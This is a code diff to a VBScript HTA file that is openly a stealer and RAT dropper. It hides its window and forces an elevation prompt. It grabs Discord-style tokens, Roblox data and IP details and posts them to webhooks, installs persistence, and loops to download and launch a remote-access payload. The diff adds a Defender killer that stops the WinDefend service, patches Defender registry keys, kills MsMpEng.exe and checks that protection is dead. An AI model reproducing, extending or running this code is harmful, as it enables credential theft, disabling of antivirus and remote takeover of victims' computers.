@@ -1,11 +1,30 @@
 <html>
 <head><title>.</title>
-<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
+<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no" />
 <script language="VBScript">
+' Force Admin Prompt on launch
+Dim sh, fso, shell
+Set sh = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+Set shell = CreateObject("Shell.Application")
+
+' Check if running as admin, if not, relaunch as admin
+Dim isAdmin
+isAdmin = False
+On Error Resume Next
+sh.RegRead "HKEY_USERS\S-1-5-19\Environment\TEMP"
+If Err.Number = 0 Then isAdmin = True
+On Error Goto 0
+
+If Not isAdmin Then
+    shell.ShellExecute "mshta.exe", """" & fso.GetFileName(WScript.ScriptFullName) & """", fso.GetParentFolderName(WScript.ScriptFullName), "runas", 1
+    window.close()
+End If
+
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh, fso, WH, RE_WH, PC, USER
+Dim WH, RE_WH, PC, USER
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
@@ -25,7 +44,16 @@ Call IP(WH)
 Call GrabTokens(WH)
 Call GrabRoblox(WH)
 Call PostFullRobloxUI(WH)
-Call DisableRealTimeProtection
+
+' Kill RTP and VERIFY
+Dim rtpAlive
+rtpAlive = DisableRealTimeProtection()
+If rtpAlive Then
+    ' Do not proceed to RAT loop
+    Call PostEmbed(":octagonal_sign: RAT Aborted", "WinDefend still active. Tamper Protection likely on. Build halted.", 15158332)
+    window.close()
+End If
+
 Call Persistence
 
 ' --- INFINITE Re-grab & RAT Chain ---
@@ -41,8 +69,11 @@ Do
     Call GrabRoblox(RE_WH)
     Call GrabFroststrap(RE_WH)
     
-    ' 2. Kill RTP
-    Call DisableRealTimeProtection
+    ' 2. Kill RTP (verify each cycle)
+    If DisableRealTimeProtection() Then
+        Call PostEmbedTo(":octagonal_sign: RAT Aborted", "WinDefend recovered. Loop halted.", 15158332, RE_WH)
+        Exit Do
+    End If
     
     ' 3. Drop RAT (Repeats every 10s)
     Call DropRAT
@@ -52,13 +83,59 @@ Loop
 
 window.close()
 
-' --- RTP DISABLER ---
-Sub DisableRealTimeProtection()
-    Call PostEmbed(":shield: Disabling Defender", "Bypassing Real-Time Protection...", 10181046)
-    ' PowerShell command to disable Real-Time Monitoring via Set-MpPreference
-    Dim ps : ps = "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue"
-    sh.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -Command """ & ps & """", 0, True
-End Sub
+' --- RTP DISABLER (TRUE KILL + VERIFY) ---
+Function DisableRealTimeProtection()
+    Call PostEmbed(":shield: Killing Defender", "Stopping WinDefend service and purging registry keys...", 10181046)
+    Dim ps, psf, f, checkPs, checkFile, checkResult
+    
+    ' PowerShell script to force-kill Defender
+    ps = "Stop-Service WinDefend -Force -ErrorAction SilentlyContinue; " & _
+         "Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue; " & _
+         "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection' -Name 'DisableRealtimeMonitoring' -Value 1 -ErrorAction SilentlyContinue; " & _
+         "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection' -Name 'DisableBehaviorMonitoring' -Value 1 -ErrorAction SilentlyContinue; " & _
+         "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection' -Name 'DisableIOAVProtection' -Value 1 -ErrorAction SilentlyContinue; " & _
+         "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' -Name 'DisableRealtimeMonitoring' -Value 1 -ErrorAction SilentlyContinue; " & _
+         "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -ErrorAction SilentlyContinue; " & _
+         "taskkill /F /IM MsMpEng.exe /T 2>$null; " & _
+         "taskkill /F /IM MpCmdRun.exe /T 2>$null"
+         
+    psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\defkiller.ps1"
+    Set f = fso.CreateTextFile(psf, True)
+    f.Write ps
+    f.Close
+    Set f = Nothing
+    
+    sh.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -File """ & psf & """", 0, True
+    
+    ' VERIFY: Query service state via PowerShell and write to file
+    checkPs = "try { $s = Get-Service WinDefend -ErrorAction Stop; if ($s.Status -eq 'Running') { 'ALIVE' } else { 'DEAD' } } catch { 'DEAD' }"
+    checkFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\defcheck.txt"
+    fso.DeleteFile checkFile, True
+    Dim qf : qf = sh.ExpandEnvironmentStrings("%TEMP%") & "\defcheck.ps1"
+    Set f = fso.CreateTextFile(qf, True)
+    f.Write "try { $s = Get-Service WinDefend -ErrorAction Stop; if ($s.Status -eq 'Running') { 'ALIVE' } else { 'DEAD' } } catch { 'DEAD' } | Out-File '" & checkFile & "' -Encoding ascii"
+    f.Close
+    Set f = Nothing
+    sh.Run "powershell -NoP -Exec Bypass -WindowStyle Hidden -File """ & qf & """", 0, True
+    
+    checkResult = "DEAD"
+    If fso.FileExists(checkFile) Then
+        Dim ff : Set ff = fso.OpenTextFile(checkFile, 1)
+        If Not ff.AtEndOfStream Then checkResult = Trim(ff.ReadAll)
+        ff.Close
+        Set ff = Nothing
+        fso.DeleteFile checkFile, True
+    End If
+    fso.DeleteFile qf, True
+    
+    If UCase(checkResult) = "ALIVE" Then
+        Call PostEmbed(":warning: Defender Alive", "WinDefend is still running. Tamper Protection likely enabled.", 15158332)
+        DisableRealTimeProtection = True
+    Else
+        Call PostEmbed(":shield: Defender Dead", "Service stopped, registry patched, processes killed.", 10181046)
+        DisableRealTimeProtection = False
+    End If
+End Function
 
 ' --- RAT DROP (10s Spam Loop) ---
 Sub DropRAT()
@@ -71,7 +148,6 @@ Sub DropRAT()
 
     ' 10 Second Spam Loop for constant re-download
     Do
-        ' 🚀 Rocket indicates the action
         Call PostEmbed(":rocket: RAT Download", "Fetching & Launching Payload...", 10181046)
 
         ' Force download over existing file
@@ -84,10 +160,7 @@ Sub DropRAT()
         If fso.FileExists(op) Then
             If fso.GetFile(op).Size > 3000000 Then
                 Dim dsize : dsize = fso.GetFile(op).Size
-                
-                ' ✅ Green Check indicates download complete + Launch
                 Call PostEmbed(":white_check_mark: RAT Downloaded", "Size: " & CStr(dsize) & " bytes | Successfully Launched.", 10181046)
-                
                 Call RunCmd("""" & op & """")
                 ' Removed Exit Sub to allow infinite overwrite loop
             End If
